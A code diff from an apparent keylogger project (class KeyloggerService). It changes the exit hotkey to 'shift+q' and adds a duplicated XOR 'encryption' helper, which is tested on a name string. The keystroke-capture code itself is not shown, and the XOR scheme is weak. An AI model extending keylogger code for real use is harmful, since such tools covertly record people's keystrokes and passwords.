@@ -20,7 +20,7 @@ class KeyloggerService:
 
 
     def __exit_point(self):
-        if keyboard.is_pressed('q'):
+        if keyboard.is_pressed('shift+q'):
             os._exit(0)
             self.__change_action()
 
@@ -112,5 +112,30 @@ A.main()
 
 
 
+class Encryptor:
+    @staticmethod
+    def xor_encryption(text, key):
+        encrypted_text = ""
+        for i in range(len(text)):
+            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
+        return encrypted_text
 
 
+
+
+def xor_encryption(text, key):
+    # Initialize an empty string for encrypted text
+    encrypted_text = ""
+
+    # Iterate over each character in the text
+    for i in range(len(text)):
+        encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
+
+    # Return the encrypted text
+    return encrypted_text
+
+
+a = (xor_encryption("daniel cohen", "5"))
+print(a)
+b = xor_encryption(a,"5")
+print(b)
